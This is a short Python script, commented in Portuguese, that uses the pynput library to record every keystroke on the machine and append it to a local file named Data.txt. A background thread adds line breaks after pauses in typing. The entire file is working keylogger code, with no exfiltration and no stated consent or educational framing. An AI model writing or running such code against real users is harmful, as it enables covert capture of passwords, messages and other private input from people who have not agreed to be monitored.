from pynput.keyboard import Listener
import time
import threading

# Variável para rastrear o tempo da última interação
last_interaction_time = time.time()


def save_typed_info(key):
    global last_interaction_time

    alpha = str(key)
    alpha = alpha.replace("'", " ")
    with open('Data.txt', 'a') as file:
        file.write(alpha)

    # Atualizar o tempo da última interação
    last_interaction_time = time.time()

# Função para esperar 3 segundos e pular uma nova linha se não houver interações


def wait_and_newline():
    global last_interaction_time
    while True:
        if time.time() - last_interaction_time > 3:
            with open('Data.txt', 'a') as file:
                file.write('\n')
        time.sleep(1)


# Iniciar a thread de espera
thread = threading.Thread(target=wait_and_newline)
thread.daemon = True
thread.start()

# Driver code
with Listener(on_press=save_typed_info) as source:
    source.join()
